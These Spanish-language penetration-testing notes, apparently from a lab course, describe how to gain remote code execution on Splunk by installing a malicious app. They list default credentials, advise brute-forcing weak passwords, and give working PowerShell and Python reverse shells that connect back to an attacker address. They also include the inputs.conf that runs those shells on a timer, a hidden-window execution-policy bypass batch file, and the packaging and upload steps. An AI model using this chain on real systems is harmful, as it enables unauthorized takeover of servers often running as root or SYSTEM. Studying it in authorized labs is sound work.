- Herramienta de recopilación, analisis y visualización de datos.
- Suele correr como root o SYSTEM.
- Corre por defecto en el puerto 8000
- La version free no requiere autenticación.
-  Default credentials: admin:changeme.
-  SI las credenciales anteriores no funcionan, siempre sirve hacer fuerza bruta con weak passwords.
-  Viene con python instalado.


### Enumeration

    https://10.129.201.50:8000/en-US/app/launcher/home

### Exploitation

Podemos tener RCE si creamos una aplicación en python, batch o Powershell.

##### 1) Creamos una aplicación con la estructura de directorios:

        splunk_shell/
        ├── bin
        └── default

##### 2) En la carpeta bin metemos los scripts que vamos a correr y en el directorio default tenemos que poner los inputs.conf

###### Script de shell reversa en powershell si el server es windows:

        #A simple and small reverse shell. Options and help removed to save space. 
        #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
        $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

###### Script en python si el server es Linux:

        import sys,socket,os,pty
        
        ip="attacker-ip-here"  
        port="attacker port here"  
        s=socket.socket()  
        s.connect((ip,int(port)))  
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        pty.spawn('/bin/bash')  

##### 3)El inputs.conf
Este es el archivo que le dice a splunk qué script debe correr. 

        [script://./bin/rev.py]
        disabled = 0  
        interval = 10  
        sourcetype = shell 
        
        [script://.\bin\run.bat]
        disabled = 0
        sourcetype = shell
        interval = 10

##### 4)Necesitamos un .bat que corra la powershell una vez deployada la app.

        @ECHO OFF
        PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
        Exit

##### 5) Una vez esto está creado debemos pasarlo a un tar.
        tar -cvzf updater.tar.gz splunk_shell/

##### 6) Subir e instalar la aplicación:

        https://10.129.201.50:8000/en-US/manager/search/apps/local

##### 7)Vamos a install app from file  e iniciamos un listener e instalamos la app
Ni bien se instale, la shell va a correr.
        
